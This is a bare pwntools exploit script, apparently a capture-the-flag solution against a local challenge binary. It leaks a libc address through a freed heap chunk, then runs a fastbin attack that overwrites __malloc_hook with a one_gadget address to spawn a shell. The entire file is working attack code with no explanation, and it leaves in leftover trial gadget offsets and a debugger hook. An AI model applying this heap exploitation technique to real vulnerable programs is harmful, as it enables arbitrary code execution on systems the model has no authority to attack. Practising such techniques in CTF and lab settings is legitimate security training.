#!/usr/bin/env pythonm
from pwn import *
context.arch='amd64'
context.log_level='debug'
p=process('./pwn')
ru=lambda s:p.recvuntil(s)
sd=lambda s:p.send(s)
sl=lambda s:p.sendline(s)

def menu(i):
    ru('> ')
    sl(str(i))

def add(data):
    menu(1)
    ru(':\n')
    sd(data)

def show(index):
    menu(2)
    ru(': ')
    sl(str(index))

def edit(index,content):
    menu(3)
    ru(': ')
    sl(str(index))
    sleep(0.1)
    sd(content)

def delete(index):
    menu(4)
    ru(': ')
    sl(str(index))

def debugf(payload=''):
    gdb.attach(p,payload)

add('a'*0x80+'\n')         # 0
add('a'*0x80+'\n')         # 1
# add('c'*0xff)



delete(0)
show(1)
libc_addr=u64(p.recvline()[0:6].ljust(8,'\x00'))
print(hex(libc_addr))
libc_base=libc_addr-0x3c4b78
print(hex(libc_base))
debugf()
add('a'*0x60+'\n')         # 2
add('a'*0x60+'\n')         # 3
add('b'*0x60+'\n')         # 4
# delete(1)
delete(2)
delete(4)
delete(3)

malloc_hook=libc_base+0x3c4b10
malloc_target=malloc_hook-0x23

add(p64(malloc_target).ljust(0x60,'\x00')+'\n')

add('q'*0x60+'\n')
add('w'*0x60+'\n')


one_off=0x45216
one_off=0x4526a
one_off=0xf02a4
one_off=0xf1147
one=libc_base+one_off
add(('a'*0x13+p64(one)).ljust(0x60,'\x00')+'\n')
p.interactive()